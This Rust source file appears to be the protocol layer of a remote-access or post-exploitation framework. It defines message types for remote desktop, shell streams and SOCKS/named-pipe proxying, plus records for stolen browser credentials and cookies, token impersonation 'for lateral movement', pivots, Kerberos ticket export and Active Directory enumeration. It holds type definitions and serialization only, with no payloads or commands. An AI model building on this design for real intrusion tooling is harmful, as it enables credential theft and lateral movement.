#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScreenTile {
    pub x: u16,
    pub y: u16,
    pub width: u16,
    pub height: u16,
    pub jpeg_data: Vec<u8>,
}

/// H.264 encoded frame for remote desktop
/// Wire format: [width:u16][height:u16][is_keyframe:u8][timestamp_ms:u64][data_len:u32][data...]
#[derive(Debug, Clone)]
pub struct H264Frame {
    pub width: u16,
    pub height: u16,
    pub is_keyframe: bool,
    pub timestamp_ms: u64,
    /// H.264 NAL unit data (Annex B format)
    pub data: Vec<u8>,
}

impl H264Frame {
    /// Parse an H.264 frame from binary data
    pub fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.len() < 17 {
            return None;
        }

        let width = u16::from_le_bytes([data[0], data[1]]);
        let height = u16::from_le_bytes([data[2], data[3]]);
        let is_keyframe = data[4] != 0;
        let timestamp_ms = u64::from_le_bytes([
            data[5], data[6], data[7], data[8],
            data[9], data[10], data[11], data[12],
        ]);
        let data_len = u32::from_le_bytes([data[13], data[14], data[15], data[16]]) as usize;

        if data.len() < 17 + data_len {
            return None;
        }

        Some(H264Frame {
            width,
            height,
            is_keyframe,
            timestamp_ms,
            data: data[17..17 + data_len].to_vec(),
        })
    }

    /// Serialize to binary format
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(17 + self.data.len());
        buf.extend_from_slice(&self.width.to_le_bytes());
        buf.extend_from_slice(&self.height.to_le_bytes());
        buf.push(if self.is_keyframe { 1 } else { 0 });
        buf.extend_from_slice(&self.timestamp_ms.to_le_bytes());
        buf.extend_from_slice(&(self.data.len() as u32).to_le_bytes());
        buf.extend_from_slice(&self.data);
        buf
    }
}

/// Tile-based frame for remote desktop (legacy JPEG format)
/// Wire format: [width:u16][height:u16][is_keyframe:u8][tile_count:u16][tiles...]
/// Each tile: [x:u16][y:u16][w:u16][h:u16][jpeg_len:u32][jpeg_data...]
#[derive(Debug, Clone)]
pub struct TileFrame {
    pub width: u16,
    pub height: u16,
    pub is_keyframe: bool,
    pub tiles: Vec<ScreenTile>,
}

impl TileFrame {
    /// Parse a tile frame from binary data
    pub fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.len() < 7 {
            return None;
        }

        let width = u16::from_le_bytes([data[0], data[1]]);
        let height = u16::from_le_bytes([data[2], data[3]]);
        let is_keyframe = data[4] != 0;
        let tile_count = u16::from_le_bytes([data[5], data[6]]) as usize;

        let mut offset = 7;
        let mut tiles = Vec::with_capacity(tile_count);

        for _ in 0..tile_count {
            if offset + 12 > data.len() {
                return None;
            }

            let x = u16::from_le_bytes([data[offset], data[offset + 1]]);
            let y = u16::from_le_bytes([data[offset + 2], data[offset + 3]]);
            let w = u16::from_le_bytes([data[offset + 4], data[offset + 5]]);
            let h = u16::from_le_bytes([data[offset + 6], data[offset + 7]]);
            let jpeg_len = u32::from_le_bytes([
                data[offset + 8],
                data[offset + 9],
                data[offset + 10],
                data[offset + 11],
            ]) as usize;

            offset += 12;

            if offset + jpeg_len > data.len() {
                return None;
            }

            let jpeg_data = data[offset..offset + jpeg_len].to_vec();
            offset += jpeg_len;

            tiles.push(ScreenTile {
                x,
                y,
                width: w,
                height: h,
                jpeg_data,
            });
        }

        Some(TileFrame {
            width,
            height,
            is_keyframe,
            tiles,
        })
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialEntry {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CookieEntry {
    pub browser: String,
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires: String,
    pub secure: bool,
    pub http_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HostsEntry {
    pub ip: String,
    pub hostname: String,
    pub comment: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegistryKeyInfo {
    pub name: String,
    pub subkey_count: u32,
    pub value_count: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegistryValueInfo {
    pub name: String,
    pub value_type: String,  // "String", "DWord", "QWord", "Binary", "ExpandString", "MultiString", "None"
    pub data: String,        // String representation of the value
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScheduledTaskInfo {
    /// Full path/name of the task (e.g., "\Microsoft\Windows\Task")
    pub name: String,
    /// Task folder path
    pub path: String,
    /// Task status: "Ready", "Running", "Disabled", "Unknown"
    pub status: String,
    /// Last run time (ISO 8601 format or "Never")
    pub last_run: String,
    /// Last run result code
    pub last_result: i32,
    /// Next scheduled run time (ISO 8601 format or "None")
    pub next_run: String,
    /// Trigger description (e.g., "Daily at 3:00 AM")
    pub trigger: String,
    /// Action description (e.g., "C:\Program.exe")
    pub action: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsCacheEntry {
    /// Hostname
    pub name: String,
    /// Record type (A, AAAA, CNAME, etc.)
    pub record_type: String,
    /// Resolved data (IP address or CNAME target)
    pub data: String,
    /// TTL in seconds
    pub ttl: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkHost {
    /// IP address
    pub ip: String,
    /// Hostname if resolved
    pub hostname: Option<String>,
    /// Open ports discovered
    pub open_ports: Vec<u16>,
    /// MAC address if available (from ARP)
    pub mac: Option<String>,
    /// OS guess based on fingerprinting
    pub os_hint: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmbShare {
    /// Share name
    pub name: String,
    /// Share type (Disk, Printer, IPC, etc.)
    pub share_type: String,
    /// Share remark/description
    pub remark: Option<String>,
    /// Whether current creds have access
    pub accessible: bool,
}

/// Token info for lateral movement impersonation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TokenInfo {
    /// Unique token ID
    pub id: u32,
    /// Domain of the token
    pub domain: String,
    /// Username of the token
    pub username: String,
    /// Whether this token is currently being impersonated
    pub active: bool,
    /// Token type (Primary or Impersonation)
    pub token_type: String,
}

/// Pivot connection info
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotInfo {
    /// Unique pivot ID
    pub id: u32,
    /// Remote host
    pub host: String,
    /// Pipe name
    pub pipe_name: String,
    /// Connection status
    pub status: String,
    /// Remote agent ID if connected
    pub remote_agent_id: Option<String>,
}

// ============================================================================
// Active Directory Types
// ============================================================================

/// Domain user information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdUser {
    /// SAM account name (e.g., "jsmith")
    pub sam_account_name: String,
    /// Display name (e.g., "John Smith")
    pub display_name: Option<String>,
    /// User principal name (e.g., "jsmith@domain.com")
    pub upn: Option<String>,
    /// Distinguished name
    pub dn: Option<String>,
    /// Account is enabled
    pub enabled: bool,
    /// Account is admin (Domain Admins member)
    pub is_admin: bool,
    /// Account is a service account
    pub is_service_account: bool,
    /// Last logon timestamp
    pub last_logon: Option<String>,
    /// Password last set timestamp
    pub pwd_last_set: Option<String>,
    /// Account description
    pub description: Option<String>,
    /// User account control flags
    pub uac_flags: u32,
}

/// Domain group information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdGroup {
    /// SAM account name
    pub sam_account_name: String,
    /// Distinguished name
    pub dn: Option<String>,
    /// Group scope (Global, DomainLocal, Universal)
    pub scope: String,
    /// Group type (Security, Distribution)
    pub group_type: String,
    /// Member count
    pub member_count: u32,
    /// Description
    pub description: Option<String>,
}

/// Group member information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdGroupMember {
    /// SAM account name
    pub sam_account_name: String,
    /// Distinguished name
    pub dn: String,
    /// Object type (user, group, computer)
    pub object_type: String,
}

/// Domain computer information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdComputer {
    /// Computer name (SAM account name without $)
    pub name: String,
    /// DNS hostname
    pub dns_hostname: Option<String>,
    /// Operating system
    pub os: Option<String>,
    /// Operating system version
    pub os_version: Option<String>,
    /// IP addresses
    pub ip_addresses: Vec<String>,
    /// Is domain controller
    pub is_dc: bool,
    /// Is server (vs workstation)
    pub is_server: bool,
    /// Last logon timestamp
    pub last_logon: Option<String>,
    /// Description
    pub description: Option<String>,
}

/// Service Principal Name entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdSpnEntry {
    /// SPN string (e.g., "MSSQLSvc/server.domain.com:1433")
    pub spn: String,
    /// Associated user/computer SAM account name
    pub account_name: String,
    /// Account distinguished name
    pub account_dn: String,
    /// Account is a user (vs computer)
    pub is_user_account: bool,
    /// Service type (extracted from SPN)
    pub service_type: String,
    /// Target host (extracted from SPN)
    pub target_host: String,
}

/// Logged-on session information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdSession {
    /// Username
    pub username: String,
    /// Computer where session exists
    pub computer: String,
    /// Session ID
    pub session_id: u32,
    /// Session type (interactive, network, etc.)
    pub session_type: String,
    /// Logon time
    pub logon_time: Option<String>,
}

/// Domain trust information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdTrust {
    /// Trusted domain name
    pub target_domain: String,
    /// Trust direction (Inbound, Outbound, Bidirectional)
    pub direction: String,
    /// Trust type (TreeRoot, ParentChild, External, Forest)
    pub trust_type: String,
    /// Is transitive
    pub is_transitive: bool,
    /// SID filtering enabled
    pub sid_filtering: bool,
}

// ============================================================================
// Local Security Types
// ============================================================================

/// Local group information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LocalGroupInfo {
    /// Group name
    pub name: String,
    /// Group comment/description
    pub comment: Option<String>,
    /// Group members
    pub members: Vec<LocalGroupMember>,
}

/// Local group member
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LocalGroupMember {
    /// Member name (DOMAIN\user or COMPUTERNAME\user)
    pub name: String,
    /// SID string
    pub sid: String,
    /// Member type (User, Group, WellKnownGroup, etc.)
    pub member_type: String,
    /// Domain or computer name
    pub domain: Option<String>,
}

/// Remote access rights information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteAccessInfo {
    /// Users/groups with RDP access (Remote Desktop Users + Administrators)
    pub rdp_access: Vec<String>,
    /// Users/groups with WinRM access (Remote Management Users + Administrators)
    pub winrm_access: Vec<String>,
    /// Users/groups with DCOM access (Distributed COM Users + Administrators)
    pub dcom_access: Vec<String>,
    /// WinRM service enabled
    pub winrm_enabled: bool,
    /// RDP enabled
    pub rdp_enabled: bool,
    /// DCOM enabled
    pub dcom_enabled: bool,
}

/// AD object ACL entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdObjectAcl {
    /// Object distinguished name
    pub object_dn: String,
    /// Object type (user, group, computer, ou, gpo)
    pub object_type: String,
    /// Object name (CN or sAMAccountName)
    pub object_name: String,
    /// ACEs (Access Control Entries) of interest
    pub aces: Vec<AdAce>,
}

/// AD Access Control Entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdAce {
    /// Principal (who has the right) - resolved name
    pub principal: String,
    /// Principal SID
    pub principal_sid: String,
    /// Right type (GenericAll, WriteDACL, WriteOwner, etc.)
    pub right: String,
    /// Is inherited
    pub inherited: bool,
    /// Access type (Allow or Deny)
    pub access_type: String,
    /// Object type GUID (for extended rights)
    pub object_type_guid: Option<String>,
    /// Inherited object type GUID
    pub inherited_object_type_guid: Option<String>,
}

// ============================================================================
// Kerberos Types
// ============================================================================

/// Kerberos ticket information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberosTicket {
    /// Client principal name
    pub client_name: String,
    /// Client realm
    pub client_realm: String,
    /// Server principal name (SPN)
    pub server_name: String,
    /// Server realm
    pub server_realm: String,
    /// Encryption type
    pub etype: String,
    /// Ticket start time
    pub start_time: String,
    /// Ticket end time
    pub end_time: String,
    /// Ticket renew until time
    pub renew_until: Option<String>,
    /// Ticket flags (forwardable, renewable, etc.)
    pub flags: Vec<String>,
    /// Base64-encoded ticket (for export)
    pub ticket_b64: Option<String>,
}

/// Media frame message (video frame + optional audio chunk)
/// Used for JSON serialization path (legacy)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MediaFrameMessage {
    /// JPEG-encoded video frame (base64 encoded string)
    pub video_data: Option<String>,
    /// Audio samples (PCM, base64 encoded string)
    pub audio_data: Option<String>,
    /// Frame timestamp (ms since stream start)
    pub timestamp_ms: u64,
    /// Frame width
    pub width: u32,
    /// Frame height
    pub height: u32,
}

/// Binary media frame - more efficient for streaming
/// Wire format v2 (LZ4 compressed):
/// [timestamp_ms:u64][width:u16][height:u16][flags:u8][orig_len:u32][data_len:u32][data...]
/// flags: bit 0 = compressed (1) or raw (0)
#[derive(Debug, Clone)]
pub struct BinaryMediaFrame {
    pub timestamp_ms: u64,
    pub width: u16,
    pub height: u16,
    pub jpeg_data: Vec<u8>,
}

/// Frame flags
const FRAME_FLAG_COMPRESSED: u8 = 0x01;

impl BinaryMediaFrame {
    /// Serialize to binary format with LZ4 compression
    pub fn to_bytes(&self) -> Vec<u8> {
        // Compress JPEG data with LZ4
        let compressed = lz4_flex::compress_prepend_size(&self.jpeg_data);

        // Only use compression if it actually saves space
        let (flags, data, orig_len) = if compressed.len() < self.jpeg_data.len() {
            (FRAME_FLAG_COMPRESSED, compressed, self.jpeg_data.len() as u32)
        } else {
            (0u8, self.jpeg_data.clone(), self.jpeg_data.len() as u32)
        };

        let mut buf = Vec::with_capacity(21 + data.len());
        buf.extend_from_slice(&self.timestamp_ms.to_be_bytes()); // 8 bytes
        buf.extend_from_slice(&self.width.to_be_bytes());        // 2 bytes
        buf.extend_from_slice(&self.height.to_be_bytes());       // 2 bytes
        buf.push(flags);                                          // 1 byte
        buf.extend_from_slice(&orig_len.to_be_bytes());          // 4 bytes
        buf.extend_from_slice(&(data.len() as u32).to_be_bytes()); // 4 bytes
        buf.extend_from_slice(&data);
        buf
    }

    /// Deserialize from binary format (handles both compressed and uncompressed)
    pub fn from_bytes(data: &[u8]) -> Option<Self> {
        // Try new format first (21 byte header)
        if data.len() >= 21 {
            let timestamp_ms = u64::from_be_bytes(data[0..8].try_into().ok()?);
            let width = u16::from_be_bytes(data[8..10].try_into().ok()?);
            let height = u16::from_be_bytes(data[10..12].try_into().ok()?);
            let flags = data[12];
            let orig_len = u32::from_be_bytes(data[13..17].try_into().ok()?) as usize;
            let data_len = u32::from_be_bytes(data[17..21].try_into().ok()?) as usize;

            if data.len() >= 21 + data_len {
                let payload = &data[21..21 + data_len];

                let jpeg_data = if flags & FRAME_FLAG_COMPRESSED != 0 {
                    // Decompress LZ4 (lz4_flex prepend_size format includes size header)
                    lz4_flex::decompress_size_prepended(payload).ok()?
                } else {
                    payload.to_vec()
                };

                // Validate decompressed size matches
                if jpeg_data.len() != orig_len {
                    return None;
                }

                return Some(Self { timestamp_ms, width, height, jpeg_data });
            }
        }

        // Fallback: try legacy 16-byte header format for backwards compatibility
        if data.len() >= 16 {
            let timestamp_ms = u64::from_be_bytes(data[0..8].try_into().ok()?);
            let width = u16::from_be_bytes(data[8..10].try_into().ok()?);
            let height = u16::from_be_bytes(data[10..12].try_into().ok()?);
            let jpeg_len = u32::from_be_bytes(data[12..16].try_into().ok()?) as usize;

            if data.len() >= 16 + jpeg_len {
                let jpeg_data = data[16..16 + jpeg_len].to_vec();
                return Some(Self { timestamp_ms, width, height, jpeg_data });
            }
        }

        None
    }
}

/// Updated system info from client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InfoUpdateMessage {
    pub system_info: SystemInfo,
}

/// Client goodbye message
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GoodbyeMessage {
    pub reason: Option<String>,
}

/// Shell output stream message (sent continuously while shell is active)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellOutputMessage {
    /// Output data from shell (stdout and stderr combined)
    pub data: String,
}

/// Shell exit message (sent when shell process terminates)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellExitMessage {
    /// Exit code if available
    pub exit_code: Option<i32>,
}

// ============================================================================
// SOCKS5 / Named Pipe Proxy Messages
// ============================================================================

/// Proxy connection target type
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum ProxyTarget {
    /// TCP connection (existing SOCKS5 behavior)
    Tcp { host: String, port: u16 },
    /// Local named pipe (\\.\pipe\name)
    LocalPipe { pipe_name: String },
    /// Remote named pipe via SMB (\\server\pipe\name)
    /// Optionally with credentials for impersonation
    RemotePipe {
        server: String,
        pipe_name: String,
        /// Optional credentials for LogonUser impersonation
        username: Option<String>,
        password: Option<String>,
        domain: Option<String>,
    },
}

impl ProxyTarget {
    /// Create a TCP target
    pub fn tcp(host: impl Into<String>, port: u16) -> Self {
        Self::Tcp { host: host.into(), port }
    }

    /// Create a local pipe target
    pub fn local_pipe(pipe_name: impl Into<String>) -> Self {
        Self::LocalPipe { pipe_name: pipe_name.into() }
    }

    /// Create a remote pipe target
    pub fn remote_pipe(server: impl Into<String>, pipe_name: impl Into<String>) -> Self {
        Self::RemotePipe {
            server: server.into(),
            pipe_name: pipe_name.into(),
            username: None,
            password: None,
            domain: None,
        }
    }

    /// Create a remote pipe target with credentials
    pub fn remote_pipe_with_creds(
        server: impl Into<String>,
        pipe_name: impl Into<String>,
        username: impl Into<String>,
        password: impl Into<String>,
        domain: Option<String>,
    ) -> Self {
        Self::RemotePipe {
            server: server.into(),
            pipe_name: pipe_name.into(),
            username: Some(username.into()),
            password: Some(password.into()),
            domain,
        }
    }

    /// Get a display string for logging
    pub fn display(&self) -> String {
        match self {
            Self::Tcp { host, port } => format!("{}:{}", host, port),
            Self::LocalPipe { pipe_name } => format!("\\\\.\\pipe\\{}", pipe_name),
            Self::RemotePipe { server, pipe_name, username, .. } => {
                if let Some(user) = username {
                    format!("\\\\{}\\pipe\\{} (as {})", server, pipe_name, user)
                } else {
                    format!("\\\\{}\\pipe\\{}", server, pipe_name)
                }
            }
        }
    }
}

/// Server -> Client: Request to connect to a target
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyConnectMessage {
    /// Unique connection ID
    pub conn_id: u32,
    /// Target to connect to (TCP or named pipe)
    pub target: ProxyTarget,
}

// Legacy compatibility: keep the old field names for TCP connections
impl ProxyConnectMessage {
    /// Create a TCP connect message (backwards compatible)
    pub fn tcp(conn_id: u32, host: impl Into<String>, port: u16) -> Self {
        Self {
            conn_id,
            target: ProxyTarget::tcp(host, port),
        }
    }

    /// Create a local pipe connect message
    pub fn local_pipe(conn_id: u32, pipe_name: impl Into<String>) -> Self {
        Self {
            conn_id,
            target: ProxyTarget::local_pipe(pipe_name),
        }
    }

    /// Create a remote pipe connect message
    pub fn remote_pipe(conn_id: u32, server: impl Into<String>, pipe_name: impl Into<String>) -> Self {
        Self {
            conn_id,
            target: ProxyTarget::remote_pipe(server, pipe_name),
        }
    }

    /// Create a remote pipe connect message with credentials
    pub fn remote_pipe_with_creds(
        conn_id: u32,
        server: impl Into<String>,
        pipe_name: impl Into<String>,
        username: impl Into<String>,
        password: impl Into<String>,
        domain: Option<String>,
    ) -> Self {
        Self {
            conn_id,
            target: ProxyTarget::remote_pipe_with_creds(server, pipe_name, username, password, domain),
        }
    }
}

/// Server -> Client: Data to send to target
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDataMessage {
    /// Connection ID
    pub conn_id: u32,
    /// Data (base64 encoded for JSON transport)
    pub data: String,
}

/// Server -> Client: Close a proxy connection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyCloseMessage {
    /// Connection ID
    pub conn_id: u32,
}

/// Client -> Server: Result of connection attempt
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyConnectResultMessage {
    /// Connection ID
    pub conn_id: u32,
    /// Whether connection succeeded
    pub success: bool,
    /// Error message if failed
    pub error: Option<String>,
    /// Bound address (for SOCKS5 response)
    pub bound_addr: Option<String>,
    /// Bound port (for SOCKS5 response)
    pub bound_port: Option<u16>,
}

/// Client -> Server: Data received from target
/// (Same structure as ProxyDataMessage)
pub type ProxyDataFromClientMessage = ProxyDataMessage;

/// Client -> Server: Connection closed by target
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyClosedMessage {
    /// Connection ID
    pub conn_id: u32,
    /// Reason for close (optional)
    pub reason: Option<String>,
}

// ============================================================================
// Wire Protocol Functions
// ============================================================================

/// Read a message from a stream
pub async fn read_message<R: AsyncReadExt + Unpin>(
    reader: &mut R,
) -> Result<(u8, Vec<u8>), ProtocolError> {
    // Read length (4 bytes, big-endian)
    let mut len_buf = [0u8; 4];
    match reader.read_exact(&mut len_buf).await {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::UnexpectedEof => {
            return Err(ProtocolError::ConnectionClosed);
        }
        Err(e) => return Err(e.into()),
    }
    let len = u32::from_be_bytes(len_buf);

    // Validate length
    if len > MAX_MESSAGE_SIZE {
        return Err(ProtocolError::MessageTooLarge(len));
    }

    if len == 0 {
        return Err(ProtocolError::Io(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Empty message",
        )));
    }

    // Read message type (1 byte)
    let mut type_buf = [0u8; 1];
    reader.read_exact(&mut type_buf).await?;
    let msg_type = type_buf[0];

    // Read payload
    let payload_len = (len - 1) as usize;
    let mut payload = vec![0u8; payload_len];
    if payload_len > 0 {
        reader.read_exact(&mut payload).await?;
    }

    Ok((msg_type, payload))
}

/// Write a message to a stream
pub async fn write_message<W: AsyncWriteExt + Unpin>(
    writer: &mut W,
    msg_type: u8,
    payload: &[u8],
) -> Result<(), ProtocolError> {
    let total_len = 1 + payload.len() as u32;

    if total_len > MAX_MESSAGE_SIZE {
        return Err(ProtocolError::MessageTooLarge(total_len));
    }

    // Build header: 4 bytes length + 1 byte type
    let mut header = [0u8; 5];
    header[0..4].copy_from_slice(&total_len.to_be_bytes());
    header[4] = msg_type;

    // Single write for header + payload using vectored I/O pattern
    // This reduces syscalls from 3 to 1-2
    writer.write_all(&header).await?;
    if !payload.is_empty() {
        writer.write_all(payload).await?;
    }

    // NOTE: Flush removed - let TCP/TLS buffer handle batching
    // Caller should flush periodically if needed (e.g., after sending control messages)

    Ok(())
}

/// Helper to serialize and send a server message
pub async fn send_server_message<W: AsyncWriteExt + Unpin, T: Serialize>(
    writer: &mut W,
    msg_type: ServerMessageType,
    message: &T,
) -> Result<(), ProtocolError> {
    let payload = serde_json::to_vec(message)?;
    write_message(writer, msg_type as u8, &payload).await
}

/// Helper to serialize and send a client message
pub async fn send_client_message<W: AsyncWriteExt + Unpin, T: Serialize>(
    writer: &mut W,
    msg_type: ClientMessageType,
    message: &T,
) -> Result<(), ProtocolError> {
    let payload = serde_json::to_vec(message)?;
    write_message(writer, msg_type as u8, &payload).await
}

/// Helper to read and deserialize a client message
pub async fn read_client_message<R: AsyncReadExt + Unpin>(
    reader: &mut R,
) -> Result<(ClientMessageType, Vec<u8>), ProtocolError> {
    let (msg_type, payload) = read_message(reader).await?;
    let msg_type = ClientMessageType::try_from(msg_type)?;
    Ok((msg_type, payload))
}

/// Helper to read and deserialize a server message
pub async fn read_server_message<R: AsyncReadExt + Unpin>(
    reader: &mut R,
) -> Result<(ServerMessageType, Vec<u8>), ProtocolError> {
    let (msg_type, payload) = read_message(reader).await?;
    let msg_type = ServerMessageType::try_from(msg_type)?;
    Ok((msg_type, payload))
}
